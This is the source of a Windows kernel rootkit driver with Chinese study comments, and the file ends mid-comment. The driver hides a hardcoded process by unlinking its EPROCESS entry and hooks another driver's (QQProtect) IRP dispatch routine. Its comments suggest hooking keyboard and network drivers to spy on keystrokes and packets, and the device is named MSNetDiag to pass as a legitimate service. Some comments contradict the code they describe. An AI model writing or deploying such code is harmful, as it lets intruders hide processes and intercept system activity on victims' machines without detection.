/********************************************
description



********************************************/
#include "ntddk.h"
#include "datatype.h"
#include "dbgmsg.h"
#include "ctrlcode.h"
#include "device.h"
//#include "iomgr.h"

// 使用 build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  命令编译该驱动源文件
//#define MEM_TAG  "UseForCopyFile"
// 注意：此驱动通过sc.exe加载至内核空间时，会使用自身实现的同步机制来访问全局的活动进程链表，然后隐藏
//硬编码在内部的名称来隐藏特定进程，但此驱动卸载时并不会还原对链表的修改，因此不会重现目标进程。需要编写另外的逻辑在
// 驱动卸载时重现隐藏的进程（或者重启系统也可以）
//需要在多核系统上测试此驱动的互斥访问逻辑是否能够正常运作，反之则会导致bugcheck蓝屏

#define IopAllocateOpenPacket()                                              \
    ExAllocatePoolWithTag( NonPagedPool,                                     \
                           sizeof( OPEN_PACKET) ,                              \
                           'pOoI')


#define EPROCESS_OFFSET_PID				0xb4		//即 EPROCESS.UniqueProcessId ，偏移量为 0xb4 字节
#define EPROCESS_OFFSET_NAME				0x16c		//即 EPROCESS.ImageFileName ，偏移量为 0x16c 字节
#define EPROCESS_OFFSET_LINKS				0xb8			//即 EPROCESS.ActiveProcessLinks ，偏移量为 0xb8 字节
#define SZ_EPROCESS_NAME					0x010	// 原始文档定义中，进程名称存储在长度为15个字节字符数组中，
// 这里把长度该为16是为了把最后一个元素赋值为\0结尾标志
//其实无需如此，因为进程加载时，内核会自动把映像名称截断成14字节，然后填充到 _EPROCESS.ImageFileName[] 字段（长度15字节），
//第15字节（_EPROCESS.ImageFileName[14]）填充为\0

//extern POBJECT_TYPE* IoDriverObjectType;
//下面两个类型与一个例程是 ntddk 中未定义的，但 Windows 内核确实导出了它们的符号，因此只需用 extern 声明，即可告知链接器解析符号



extern POBJECT_TYPE* IoDeviceObjectType;


extern NTSTATUS ObReferenceObjectByName(
	IN PUNICODE_STRING ObjectPath,
	IN ULONG Attributes,
	IN PACCESS_STATE PassedAccessState OPTIONAL,
	IN ACCESS_MASK DesiredAccess OPTIONAL,
	IN POBJECT_TYPE ObjectType,
	IN KPROCESSOR_MODE AccessMode,
	IN OUT PVOID ParseContext OPTIONAL,
	OUT PVOID *ObjectPtr
);



/* MSNetDigaDeviceObject代表我们创建的设备 */
PDEVICE_OBJECT MSNetDiagDeviceObject;
/* DriverObjectRef代表我们注册的驱动 */
PDRIVER_OBJECT DriverObjectRef;
KIRQL  RaiseIRQL();
PKDPC  AcquireLock();
NTSTATUS  ReleaseLock(PVOID  dpc_pointer);
void  LowerIRQL(KIRQL  prev);
void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2);
BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
void  getProcessName(char  *dest, char  *src);
unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer);
void  WalkProcessListWithName(unsigned char* trg_proc_nme);
void  HideProcessWithName(unsigned char* trg_proc_nme);
void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer);
void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength);
NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);


NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject);
NTSTATUS RegisterDriverDeviceLink();

NTSTATUS ReferenceDeviceAndHookIRPdispatchRoutine();
VOID UnhookIRPdispatchRoutineAndDereferenceDevice();
NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

//这几个作为全局变量，否则无法通过编译（报错：局部变量未初始化）

//定义一个全局的函数指针，给挂钩例程修改，解钩例程还原目标驱动用来处理特定 IRP 的分发例程

typedef NTSTATUS (*OriginalDispatchRoutinePtr)
(

	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp

);

OriginalDispatchRoutinePtr  ori_dispt_ptr;

typedef struct _OPEN_PACKET {
	CSHORT Type;
	CSHORT Size;
	PFILE_OBJECT FileObject;
	NTSTATUS FinalStatus;
	ULONG_PTR Information;
	ULONG ParseCheck;
	PFILE_OBJECT RelatedFileObject;

	//
	// The following are the open-specific parameters.  Notice that the desired
	// access field is passed through to the parse routine via the object
	// management architecture, so it does not need to be repeated here.  Also
	// note that the same is true for the file name.
	//

	LARGE_INTEGER AllocationSize;
	ULONG CreateOptions;
	USHORT FileAttributes;
	USHORT ShareAccess;
	PVOID EaBuffer;
	ULONG EaLength;
	ULONG Options;
	ULONG Disposition;

	//
	// The following is used when performing a fast query during open to get
	// back the file attributes for a file.
	//

	PFILE_BASIC_INFORMATION BasicInformation;

	//
	// The following is used when performing a fast network query during open
	// to get back the network file attributes for a file.
	//

	PFILE_NETWORK_OPEN_INFORMATION NetworkInformation;

	//
	// The type of file to create.
	//

	CREATE_FILE_TYPE CreateFileType;

	//
	// The following pointer provides a way of passing the parameters
	// specific to the file type of the file being created to the parse
	// routine.
	//

	PVOID ExtraCreateParameters;

	//
	// The following is used to indicate that an open of a device has been
	// performed and the access check for the device has already been done,
	// but because of a reparse, the I/O system has been called again for
	// the same device.  Since the access check has already been made, the
	// state cannot handle being called again (access was already granted)
	// and it need not anyway since the check has already been made.
	//

	BOOLEAN Override;

	//
	// The following is used to indicate that a file is being opened for the
	// sole purpose of querying its attributes.  This causes a considerable
	// number of shortcuts to be taken in the parse, query, and close paths.
	//

	BOOLEAN QueryOnly;

	//
	// The following is used to indicate that a file is being opened for the
	// sole purpose of deleting it.  This causes a considerable number of
	// shortcurs to be taken in the parse and close paths.
	//

	BOOLEAN DeleteOnly;

	//
	// The following is used to indicate that a file being opened for a query
	// only is being opened to query its network attributes rather than just
	// its FAT file attributes.
	//

	BOOLEAN FullAttributes;

	//
	// The following pointer is used when a fast open operation for a fast
	// delete or fast query attributes call is being made rather than a
	// general file open.  The dummy file object is actually stored on the
	// the caller's stack rather than allocated pool to speed things up.
	//

	//PDUMMY_FILE_OBJECT LocalFileObject;

	//
	// The following is used to indicate we passed through a mount point while
	// parsing the filename. We use this to do an extra check on the device type
	// for the final file
	//

	BOOLEAN TraversedMountPoint;

	//
	// Device object where the create should start if present on the stack
	// Applicable for kernel opens only.
	//

	ULONG           InternalFlags;      // Passed from IopCreateFile
	PDEVICE_OBJECT  TopDeviceObjectHint;

} OPEN_PACKET, *POPEN_PACKET;

POPEN_PACKET openPacket;


//下面这三个全局变量供挂钩和解钩例程引用与解引目标驱动和设备对象

PFILE_OBJECT			ref_file;
PDEVICE_OBJECT			ref_device;
PDRIVER_OBJECT			ref_driver;


KIRQL  old_irql;


//如果作为全局变量定义出现问题，则把它们移至 DriverEntry() 中定义
//unsigned char*  target_hide_process_name_null_terminated = “QQProtect.exe\0”;

//unsigned char*  target_hide_process_name = "QQProtect.exe";
unsigned char*  target_hide_process_name = "Core Temp.exe";
// 下面的3个全局变量用于在多处理器系统上同步对OS资源的访问

PKDPC  dpcPointer;		//一个指针，指向由 DPC（延迟过程调用）对象构成的数组；每处理器/核被分配一个此类数组；每处理器上的 DPC
					// 例程运行在 DISPATCH_LEVEL 级，因此可以挂起该处理器/核上运行的 OS的线程调度代码实现同步。
DWORD has_finished_access_os_res;		//当完成对OS资源的同步访问时，应将此标志置1
DWORD nCPUsLocked;		//标识当前被同步了的（运行在 DISPATCH_LEVEL）CPU/核数量，此变量应该通过 InterLocked*() 系列例程原子地进行读写
					// 声明一个位于外部汇编源文件（.../amd64/lib.asm）中的函数，它仅仅执行 nop 空指令

					// 该文件仅用于为 AMD64 体系结构（指定了 /amd64 构建选项时用），对于默认的 x86/i386 构建选项，无需声明该外部函数，
					// 而是用内联汇编语句 __asm{nop;}
					

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pdeviceObj;
	UNICODE_STRING unicodeString;
		

	DBG_TRACE("OnUnload", "First remove IRP hook and dereference target device");

	// 卸载自己前，先移除挂在人家上的钩子并解引人家的设备对象，这样人家才能卸载。无需判断是否解引成功
	UnhookIRPdispatchRoutineAndDereferenceDevice();

	// 然后卸载自己
	DBG_TRACE("OnUnload", "Received signal to unload the driver");
	pdeviceObj = (*DriverObject).DeviceObject;
	if (pdeviceObj != NULL)
	{
		DBG_TRACE("OnUnload", "Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		DBG_TRACE("OnUnload", "Unregistering driver's device name");

		//IoDeleteDevice(pdeviceObj);
		IoDeleteDevice((*DriverObject).DeviceObject);
	}


	


	return;
}


//该函数首先去掉钩子，还原到初始的分发例程，然后解引用目标设备对象
//因为实际执行解引用的 ObDereferenceObject() 一定成功（它无返回值），所以我们的封装函数也无需返回值，从而在我们的
// unload() 例程中无需判断解引目标设备对象是否成功。。。。

VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {

	//int loop_counter2;

	//先检查前面是否保存了原始分发例程
	if (ori_dispt_ptr != NULL) {


		InterlockedExchange
		(

			(PLONG) &((*ref_driver).MajorFunction[IRP_MJ_CREATE]),
			(ULONG)ori_dispt_ptr

		);


	}


	//如果没有保存，就没有挂钩，当然也不用解钩，仅需解引用后返回

	//如果能够获取设备对象指针，则使用 IoGetDeviceObjectPointer() 返回的文件对象来解引用
	/*if( ref_file != NULL ){
	
		ObDereferenceObject(ref_file);
		ref_file = NULL;

		DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "....hook and reference has been remove....");
		return;
	
	}*/


	//使用 ObReferenceObjectByName() 返回的对象指针（指向\Driver\QQProtect）来解引用
	if (ref_device != NULL) {

		ObDereferenceObject(ref_device);
		ref_device = NULL;

		DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "....hook and reference has been remove....");
		return;

	}


	//无挂钩，无引用（ori_dispt_ptr == NULL && ref_file == NULL）
	// 如果连前面的 ReferenceDeviceAndHookIRPdispatchRoutine 都引用设备对象都失败（ref_file 会等于 NULL）
	// 那么什么都不做，直接返回给 unload()，后者就可以卸载我们自己的驱动

	DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "nothing to do....because reference and hook failure.....");
	return;

}



//该函数引用目标设备对象，然后挂钩对方的 IRP 分发例程
//我们可以改为 hooked 那些驱动（例如i8204ptr.sys）导出来处理读/写请求的设备对象分发例程，这样就能够监视收发的网络数据包，用户按下的按键等

NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){

	
	NTSTATUS  ntStatus = STATUS_SUCCESS;
	UNICODE_STRING  deviceName;
	WCHAR  devNameBuffer[] = L"\\Device\\QQProtect";
	

	RtlInitUnicodeString(&deviceName, devNameBuffer);

	openPacket = (POPEN_PACKET)IopAllocateOpenPacket();
	if (openPacket == NULL) {
		DbgPrint("ReferenceDeviceAndHookIRPdispatchRoutine",  "....unable to get target object address due to STATUS_INSUFFICIENT_RESOURCES.....");
	}
	
	openPacket->Type = IO_TYPE_OPEN_PACKET;
	openPacket->Size = 0x70;


	ntStatus = ObReferenceObjectByName

	(	&deviceName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*IoDeviceObjectType,
		KernelMode,
		openPacket,
		&ref_device
	);
	
	if( !NT_SUCCESS(ntStatus) ){
	
		DBG_TRACE("ReferenceDeviceAndHookIRPdispatchRoutine", "Get Device Object Pointer Failure !" );
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the pointer 'ref_device'points to  %p\n", *ref_device);
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the NTSTATUS code is:  %p\n", ntStatus);
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the NTSTATUS code in Hexadecimal is:  0x%08X\n", ntStatus);
		return (ntStatus);

	}


	ref_driver =  (*ref_device).DriverObject;

	//我们仅保存并 hook 目标驱动用于处理 IRP_MJ_DEVICE_CONTROL 类型 IRP 的分发例程(表中第 15 个函数指针) 
	// 对于 QQProtect.sys 它初始化自己的 IRP_MJ_CREATE ，IRP_MJ_CLOSE 等例程，因此我们选其一来 hook
	//[IRP_MJ_DEVICE_CONTROL]
	ori_dispt_ptr =  (*ref_driver).MajorFunction[IRP_MJ_CREATE];

	if (ori_dispt_ptr != NULL) {


		InterlockedExchange
		(

			(PLONG) &((*ref_driver).MajorFunction[IRP_MJ_CREATE]),
			(ULONG)InterceptAndInspectOthersIRP

		);
	}
		

		DBG_TRACE("ReferenceDeviceAndHookIRPdispatchRoutine", "....... Hook target dispatch routine success ........");

		//为了验证是否成功 hook，这里我们加入软件中断，然后以调试器检查 tdx.sys 分发例程表中的第15个函数指针，分发例程表位于
		// 驱动对象偏移 0x38 字节处，加上该偏移量后，以 dps 转储表内函数名，因为索引从 0x0 开始,因此下标[0xe] 是第15个函数指针
		// 稍后在继续执行并在虚拟机的 sc.exe 卸载驱动时，再次断入调试器，检查该例程是否已被还原：
		// 挂钩后
		// kd> dps [(866add30+0x38)+ 0xe*4] L2
		//	866adda0  9300f260 hideprocess!InterceptAndInspectOthersIRP
		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl


		//解钩后
		//kd> dps [(866add30+0x38)+ 0xe*4] L2
		//	866adda0  90c6d332 tdx!TdxTdiDispatchDeviceControl
		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl
		__asm {
			int 3;
		}


		return (STATUS_SUCCESS);

	

	//若保存原始分发例程失败，我们就不能 hook ，因为无法还原来擦除痕迹，这违反了 rootkit 的原则之一！
	// 下两者选其一来编译

	
	//return  (STATUS_ASSERTION_FAILURE);
	return  (!STATUS_SUCCESS);
			
}




//如果我们用此例程钩住了QQProtect.sys 的 IRP_MJ_CREATE 分发例程，那么要如何触发对应的 IRP 送到我们这处理呢？
// 如果系统上运行着 QQProtect.exe ，将其关闭，然后启动 qq.exe 主进程，后者会检测前者是否存在，如果没有就会创建 QQProtect.exe
// 此刻就会向 I/O 管理器请求创建 IRP_MJ_CREATE IRP，最终传递到此例程中处理，可以在此例程中加入软件断点，调试检查传入的 IRP，
// 或者以编程方式检查也行
NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp){

	PIO_COMPLETION_ROUTINE original_completion_routine;
	PIO_STACK_LOCATION check_target_irp_Stack;
	ULONG ioctrlcode;

	DBG_TRACE("InterceptAndInspectOthersIRP",  "Get an IRP destined to original driver，now we can dump and modify it");

	// 此处进行转储（读取）以及修改 IRP 的工作，可参考 dispatchIOControl() 中操纵 IRP 的逻辑，但注意避开设备栈共享的那些关键字段
	
	
	// 为了稳定性，一般我们（驱动程序）只操纵某设备对象专用的 IO_STACK_LOCATION 结构；而 I/O 管理器比驱动更清楚 IRP 中各字段
	// 的用途，因此首先
	// 获取 I/O 管理器把 IRP 传递给驱动程序 tdx.sys 创建的设备对象 \Device\Tcp 时，该设备专用的 IO_STACK_LOCATION，
	// 实际上，\Device\Tcp  所在的设备栈中，只有一个设备，亦即  \Device\Tcp ：
	//kd> !devstack  \Device\Tcp
	//!DevObj   !DrvObj            !DevExt   ObjectName
	//> 866b96b0  \Driver\tdx        866b9768  Tcp
	
	
	check_target_irp_Stack = IoGetCurrentIrpStackLocation(Irp);
	
	//再次确保我们钩住并处理的 IRP 类型为 IRP_MJ_DEVICE_CONTROL
	if (check_target_irp_Stack->MajorFunction != IRP_MJ_CREATE) {

		return (!STATUS_SUCCESS);

	}

	//如前所述，干净系统中，设备对象 \Device\Tcp 所在的设备栈中只有它自己，下面验证（DeviceObject.AttachedDevice 为挂载到 
	// \Device\Tcp 的设备，它应该为空）
	if( check_target_irp_Stack->DeviceObject->AttachedDevice == NULL ){
		
		DBG_TRACE("InterceptAndInspectOthersIRP",  "we have no others rootkit monitoring QQProtect.sys's devStack !");
	
	}

	//如果存在  \Device\Tcp 设备对象的完成例程，则其打印地址，以方便后续在调试器中反汇编该函数
	if ( (original_completion_routine = check_target_irp_Stack->CompletionRoutine) != NULL ) {
	
		DBG_PRINT2("[InterceptAndInspectOthersIRP]: address of IO_STACK_LOCATION.Completion Routine is:  %p\n", original_completion_routine);
	
	}
	else
	{
		DBG_TRACE("InterceptAndInspectOthersIRP", "the QQProtect.sys doesn't supply a Completion Routine to its device object!");
	}

	// 因为我们 hooked 的是传递给 \Device\Tcp 设备对象的 IRP_MJ_DEVICE_CONTROL 类型 IRP，所以需要检查具体的 I/O 控制码，然后进行
	// 相应的操作： IO_STACK_LOCATION.Parameters.DeviceIoControl 字段专用于记录 IRP_MJ_DEVICE_CONTROL 类型 IRP 的相关信息
	// 类似地，如果 IRP 的类型为 IRP_MJ_WRITE，则 IO_STACK_LOCATION.Parameters 字段下的联合将被 I/O 管理器初始化为 Write
	// 换言之，I/O 管理器根据 IRP 的类型来初始化 IO_STACK_LOCATION.Parameters 下的联合

	
	ioctrlcode = (*check_target_irp_Stack).Parameters.DeviceIoControl.IoControlCode;

	DbgPrint(".........the IO control code sent to QQProtect.sys's dispatch routine is   %u  ........", ioctrlcode);

	DBG_TRACE("InterceptAndInspectOthersIRP",  "forward IRP to the original dispatch routine, to guarantee system work correctly");

	// 通过函数指针调用原始分发例程，转发给它进行处理，以确保系统能够正常工作，因为我们的钩子例程处理目标 IRP 的方式
	// 如果是系统，设备栈中分发例程非预期的，就可能造成系统崩溃

	return ( ori_dispt_ptr(DeviceObject, Irp) );

}





/*
* DriverObject相当于注册的驱动，DeviceObject为对应某个驱动设备
* 一个驱动可以创建多个设备，然后通过DriverObject::DeviceObject和
* DeviceObject::NextDevice遍历整个设备链表
*/
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	//因为 DriverEntry() 运行在 PASSIVE_LEVEL 中断级，所有只能在 PASSIVE_LEVEL 调用的内核例程都应该放在 DriverEntry()
	//内部调用，包括使用 DbgPrint() 打印 unicode 字符串时
	// 还需确认原子操作 InterLockedAndExchange() 是否只能在 PASSIVE_LEVEL IRQL 上调用
	//  WDK 中定义的部分数据类型与传统 C 标准的数据类型对应关系如下：
	// 检查这些类型定义是通过 #define 还是 typedef 实现
	// ULONG -> unsigned long
	// UCHAR -> unsigned char
	// UINT -> unsigned int
	// VOID -> void 
	// PULONG ->unsigned long* 
	// PUCHAR -> unsigned char*
	// PUINT -> unsigned int*
	// PVOID -> void*

	
	LARGE_INTEGER clock_interval_count_since_booted;
	//所有的内部变量都必须首先定义
	int i;						//这个必须放在最前面，否则无法通过编译
	ULONG  millsecond_count_per_clock;
	ULONG  l00nanosecond_count_per_clock;
	NTSTATUS  ntStatus;	//这个必须放在最前面，否则无法通过编译
	ULONG  data_length;
	HANDLE  my_key_handle = NULL;
	NTSTATUS  returnedStatus;
	NTSTATUS  hooked_result;		//保存我们的挂钩例程的执行结果

	UNICODE_STRING  my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	UNICODE_STRING  my_key_name = RTL_CONSTANT_STRING(L"SystemRoot");
	KEY_VALUE_PARTIAL_INFORMATION  not_complete_key_infor;
	PKEY_VALUE_PARTIAL_INFORMATION  acturally_use_key_infor;
	ULONG  acturally_key_value_length;
	OBJECT_ATTRIBUTES   my_obj_attr;
	InitializeObjectAttributes(&my_obj_attr, &my_key_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
	returnedStatus = ZwOpenKey(&my_key_handle, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(returnedStatus)) {
		DBG_TRACE("Driver Entry", ".................cannot open registry key...........");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
		&my_key_name,
		KeyValuePartialInformation,
		&not_complete_key_infor,
		sizeof(KEY_VALUE_PARTIAL_INFORMATION),
		&acturally_key_value_length);

	if (!NT_SUCCESS(returnedStatus)
		&& returnedStatus != STATUS_BUFFER_OVERFLOW
		&& returnedStatus != STATUS_BUFFER_TOO_SMALL) {
		DBG_TRACE("Driver Entry", ".................you pass the wrong arg or the key value...........");
	}

	acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, acturally_key_value_length, 'MyTg');
	if (acturally_use_key_infor == NULL) {
		returnedStatus = STATUS_INSUFFICIENT_RESOURCES;
		DBG_TRACE("Driver Entry", "..........................cannot allocate kernel mode heap memory.........................");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
		&my_key_name,
		KeyValuePartialInformation,
		acturally_use_key_infor,
		acturally_key_value_length,
		&acturally_key_value_length);

	if (NT_SUCCESS(returnedStatus)) {
		for (data_length = 0; data_length < acturally_use_key_infor->DataLength; data_length++) {
			DbgPrint("the SystemRoot=   %c\n", acturally_use_key_infor->Data[data_length]);
		}


	}
	else {
		DBG_TRACE("Driver Entry", ".................query registry key value failed......................");
	}
	//注意，DbgPrint 例程不支持任何浮点类型（%f、%e、%E、%g、%G、%a 或 %A），因此打印浮点数会造成系统崩溃
	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);

	DbgPrint("................per system clock interval is   %u   millseconds...............", millsecond_count_per_clock);
	KeQueryTickCount(&clock_interval_count_since_booted);
	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................", clock_interval_count_since_booted.LowPart);
	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................", clock_interval_count_since_booted.HighPart);
	//系统中断次数乘以每中断的毫秒数就得到启动以来经历的毫秒数


	HideProcessWithName(target_hide_process_name);

	DBG_TRACE("Driver Entry", "Driver has benn loaded");
	for (i = 0; i<IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		//因为定义 _DRIVER_OBJECT.MajorFunction : [28] Ptr32 to     long
		// 所以索引从 0到27（IRP_MJ_MAXIMUM_FUNCTION）

		// 参数定义为 PDRIVER_OBJECT DriverObject，所以解引用取得 DRIVER_OBJECT
		
		(*DriverObject).MajorFunction[i] = defaultDispatch;
		
		// 等价于	
		//DriverObject->MajorFunction[i]
	}

	//等价于 DriverObject->MajorFunction[14] = dispatchIOControl;
	// 把dispatchIOControl()注册为处理设备控制类 IRP 的例程
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;


	//MajorFunction[IRP_MJ_READ]  等于 MajorFunction[3] ，这个例程预期要处理“读请求”类型的 IRP——  
	// I/O 管理器为向下传递的 IRP 分配功能代码为 IRP_MJ_READ，该 IRP 带有一个空缓冲区，提供给驱动程序把从设备中读取的数据放在
	// 里面， 因此 _DRIVER_OBJECT.MajorFunction[3] 一般被初始化为处理读请求 IRP 的例程
	// 类似地，_DRIVER_OBJECT.MajorFunction[4] 也就是 MajorFunction[IRP_MJ_WRITE] 一般被初始化为处理写请求 IRP （IRP_MJ_WRITE）
	// 的例程，此时 I/O 管理器传递的 IRP 缓冲区内包含数据，以请求驱动程序向设备写入 

	//前面先初始化自己的 IRP 分发例程表，然后挂钩我们感兴趣的其它驱动的 IRP 分发例程表

	hooked_result = ReferenceDeviceAndHookIRPdispatchRoutine();

	// 挂钩失败，则打印信息

	if( !NT_SUCCESS(hooked_result) ){

	DBG_TRACE("Driver Entry", "Reference Device And Hook Failure ! We can only check ourself IRP !");
	
	}

	DBG_TRACE("Driver Entry", "Registering driver's device name");
	ntStatus = RegisterDriverDeviceName(DriverObject);
	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create device");
		return ntStatus;
	}

	DBG_TRACE("Driver Entry", "Registering driver's symbolic link");
	ntStatus = RegisterDriverDeviceLink();
	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create symbolic link");
		return ntStatus;
	}
	DriverObjectRef = DriverObject;
	return STATUS_SUCCESS;
}
/*
* IRP.IoStatus : 类型为IO_STATUS_BLOCK
* A driver sets an IRP's I/O status block to indicate the final status of
* an I/O request, before calling IoCompleteRequest for the IRP.
typedef struct _IO_STATUS_BLOCK {
union {
NTSTATUS Status;
PVOID    Pointer;
};
ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK

Status: This is the completion status, either STATUS_SUCCESS if the
requested operation was completed successfully or an informational,
warning, or error STATUS_XXX value.
Information: This is set to a request-dependent value. For example,
on successful completion of a transfer request, this is set
to the number of bytes transferred. If a transfer request is
completed with another STATUS_XXX, this member is set to zero.

*/



NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	/*
	The IoCompleteRequest routine indicates that the caller has
	completed all processing for a given I/O request and is
	returning the given IRP to the I/O manager.
	*/
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}
/*
* I/O堆栈单元由IO_STACK_LOCATION定义，每一个堆栈单元都对应一个设备对象。
* 我们知道，在一个驱动程序中，可以创建一个或多个设备对象，而这些设备对象
* 都对应着一个IO_STACK_LOCATION结构体，而在驱动程序中的多个设备对象，而
* 这些设备对象之间的关系为水平层次关系。
* Parameters 为每个类型的 request 提供参数，例如：Create(IRP_MJ_CREATE 请求），
* Read（IRP_MJ_READ 请求），StartDevice（IRP_MJ_PNP 的子类 IRP_MN_START_DEVICE）
*
//
// NtDeviceIoControlFile 参数
//
struct
{
ULONG OutputBufferLength;
ULONG POINTER_ALIGNMENT InputBufferLength;
ULONG POINTER_ALIGNMENT IoControlCode;
PVOID Type3InputBuffer;
} DeviceIoControl;
在DriverEntry函数中，我们设置dispatchIOControl处理IRP_MJ_DEVICE_CONTROL
类型的请求，因此在dispatchIOControl中，我们只关心IOCTL请求，Parameters中
只包含DeviceIoControl成员
*/



NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	PIO_STACK_LOCATION irpStack;
	PVOID inputBuffer;
	PVOID outputBuffer;
	ULONG inBufferLength;
	ULONG outBufferLength;
	ULONG ioctrlcode;
	NTSTATUS ntStatus;
	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;

	DBG_TRACE("dispatchIOControl", "Received a command");
	switch (ioctrlcode)
	{
	case IOCTL_TEST_CMD:
	{
		TestCommand(inputBuffer, outputBuffer, inBufferLength, outBufferLength);
		((*IRP).IoStatus).Information = outBufferLength;
	}
	break;
	default:
	{
		DBG_TRACE("dispatchIOControl", "control code not recognized");
	}
	break;
	}
	/* 在处理完请求后，调用IoCompleteRequest */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return(ntStatus);
}



void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength)
{
	char *ptrBuffer;
	DBG_TRACE("dispathIOControl", "Displaying inputBuffer");
	ptrBuffer = (char*)inputBuffer;
	DBG_PRINT2("[dispatchIOControl]: inputBuffer=%s\n", ptrBuffer);
	DBG_TRACE("dispatchIOControl", "Populating outputBuffer");
	ptrBuffer = (char*)outputBuffer;
	ptrBuffer[0] = '!';
	ptrBuffer[1] = '1';
	ptrBuffer[2] = '2';
	ptrBuffer[3] = '3';
	ptrBuffer[4] = '!';
	ptrBuffer[5] = '\0';
	DBG_PRINT2("[dispatchIOControl]:outputBuffer=%s\n", ptrBuffer);
	return;
}


// 在 windows 7 内核中，OS 的 _EPROCESS.ImageFileName[] 数组长度为15字节，超过的部分会被截断，
	//且OS 会自行把 _EPROCESS.ImageFileName[14]填充为\0，所以不需要用到此函数

/*void  getProcessName(char  *dest, char  *src){
	

	//		BYTE					BYTE*
	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) 进程映像名，复制长度为16字节 
	strncpy(dest, src, SZ_EPROCESS_NAME);

	// 最后一个元素（16-1=15）为表示字符串结尾的\0 字符
	dest[SZ_EPROCESS_NAME - 1] = '\0';

	return;
}*/


NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
{
	NTSTATUS ntStatus;
	UNICODE_STRING name_String;
	/* 利用DeviceNameBuffer来初始化name_String */
	RtlInitUnicodeString(&name_String, DeviceNameBuffer);
	/*
	* 创建一个设备，设备类型为FILE_DEVICE_RK（由我们自己在ctrlcode.h中定义)，
	* 创建的设备保存在MSNetDiagDeviceObject中
	*/
	ntStatus = IoCreateDevice
	(
		DriverObject,
		0,
		&name_String,
		FILE_DEVICE_RK,
		0,
		TRUE, &MSNetDiagDeviceObject
	);
	return (ntStatus);
}



NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING device_String;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&device_String, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
	/*
	* IoCreateSymbolicLink创建一个设备链接。驱动程序中虽然注册了设备，
